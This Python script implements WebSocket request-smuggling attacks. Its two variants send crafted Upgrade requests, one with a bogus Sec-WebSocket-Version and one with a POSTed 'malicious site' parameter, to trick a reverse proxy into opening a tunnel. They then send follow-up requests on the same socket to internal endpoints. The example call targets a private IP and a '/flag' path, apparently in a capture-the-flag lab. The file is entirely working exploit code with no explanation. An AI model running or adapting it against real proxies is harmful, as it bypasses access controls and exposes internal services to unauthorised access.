import socket
from urllib.parse import urlparse, parse_qs, urlencode

req1_prepared = """GET {path}?{params} HTTP/1.1
Host: {host}:{port}
Sec-WebSocket-Version: 1337
Upgrade: websocket
Connection: Upgrade

""".replace('\n', '\r\n')

req2_prepared = """GET {path}?{params} HTTP/1.1
Host: {host}:{port}

""".replace('\n', '\r\n')

req3_prepared ="""POST {path} HTTP/1.1
Host: {host}:{port}
Upgrade: websocket
Content-Type: application/x-www-form-urlencoded
Content-Length: {con_len}

{parameter_name}={parameter_value}

""".replace('\n', '\r\n')

req4_prepared = """GET {path}?{params} HTTP/1.1
Host: {host}:{port}

""".replace('\n', '\r\n')
def prepare_request(url,req):
    parsed_url = urlparse(url)
    host, port, path = parsed_url.hostname, parsed_url.port, parsed_url.path or '/'
    params = parsed_url.query
    return req.format(host=host, port=port, path=path, params=params)

def prepare_request2(url,req,malsite,param):
    parsed_url = urlparse(url)
    host, port, path = parsed_url.hostname, parsed_url.port, parsed_url.path or '/'
    params = parsed_url.query
    length = len(param)+1+len(malsite)
    return req.format(host=host, port=port, path=path, params=params,con_len=length,parameter_name=param,parameter_value=malsite)


def websocket_smuggling_var1(external_url,internal_url):
    req1 = prepare_request(external_url,req1_prepared)
    req2 = prepare_request(internal_url,req2_prepared)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((urlparse(external_url).hostname, urlparse(external_url).port))

    print("\nSENT ----------------------------\n")
    print(req1)
    sock.sendall(bytes(req1,'utf-8'))
    print("\nRECIVED ----------------------------\n")
    data = sock.recv(4096)
    data = data.decode(errors='ignore')
    print(data)
    print("\nSENT ----------------------------\n")
    print(req2)
    sock.sendall(bytes(req2,'utf-8'))
    print("\nRECIVED ----------------------------\n")
    data = sock.recv(4096)
    data = data.decode(errors='ignore')
    print(data)
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

def websocket_smuggling_var2(external_url, internal_url,malicoius_site,parameter_name):
    req1 = prepare_request2(external_url, req3_prepared,malicoius_site,parameter_name)
    req2 = prepare_request(internal_url, req4_prepared)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((urlparse(external_url).hostname, urlparse(external_url).port))

    print("\nSENT ----------------------------\n")
    print(req1)
    sock.sendall(bytes(req1, 'utf-8'))
    print("\nRECIVED ----------------------------\n")
    data = sock.recv(4096)
    data = data.decode(errors='ignore')
    print(data)
    print("\nSENT ----------------------------\n")
    print(req2)
    sock.sendall(bytes(req2, 'utf-8'))
    print("\nRECIVED ----------------------------\n")
    data = sock.recv(4096)
    data = data.decode(errors='ignore')
    print(data)
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    websocket_smuggling_var1('http://192.168.1.40:9020/socket.io/?EIO=3&transport=websocket','http://flask.net:5000/flag')
